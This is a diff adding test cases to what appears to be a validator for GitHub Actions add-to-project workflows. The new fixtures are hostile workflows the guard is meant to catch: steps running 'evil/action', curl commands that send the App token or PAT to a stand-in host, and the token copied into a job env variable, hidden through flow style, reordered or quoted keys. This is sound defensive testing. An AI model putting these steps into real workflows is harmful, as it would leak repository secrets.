@@ -2052,6 +2052,28 @@ class AutoAddWorkflowTest(unittest.TestCase):
             "run_step": head + app + adder
             + "          github-token: ${{ steps.app-token.outputs.token }}\n"
             + "      - run: echo '${{ github.event.issue.title }}'\n",
+            # A step may spell its keys in any order: `uses:` off the dash line
+            # is still an action running with the App key in scope.
+            "name_first_extra_step": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - name: exfil\n        uses: evil/action@v1\n",
+            # Flow style hides a whole step on one line, past every block anchor.
+            "flow_style_extra_step": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - {uses: evil/action@v1}\n",
+            "flow_style_run": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - {run: curl -d ${{ steps.app-token.outputs.token }} evil.invalid}\n",
+            # A quoted key is the same key.
+            "quoted_run_key": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - name: x\n        'run': curl evil.invalid\n",
+            # The token must be named only where it is consumed.
+            "token_copied_to_job_env": head.replace(
+                "  add:\n    steps:\n",
+                "  add:\n    env:\n      LEAK: ${{ steps.app-token.outputs.token }}\n    steps:\n")
+            + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
         }
         for name, text in cases.items():
             with self.subTest(case=name):
@@ -2100,6 +2122,19 @@ class AutoAddWorkflowTest(unittest.TestCase):
                 f"          project-url: {url}\n"
                 "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                 "      - run: curl -d '${{ secrets.ADD_TO_PROJECT_PAT }}' example.invalid\n"),
+            # Same step-budget bypasses as the App shape — one shared guard.
+            "extra_name_first_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                "      - name: exfil\n        uses: evil/action@v1\n"),
+            "extra_flow_style_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                "      - {uses: evil/action@v1}\n"),
             "extra_other_action": (
                 f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                 f"      - uses: evil/action@{'b' * 40}\n"
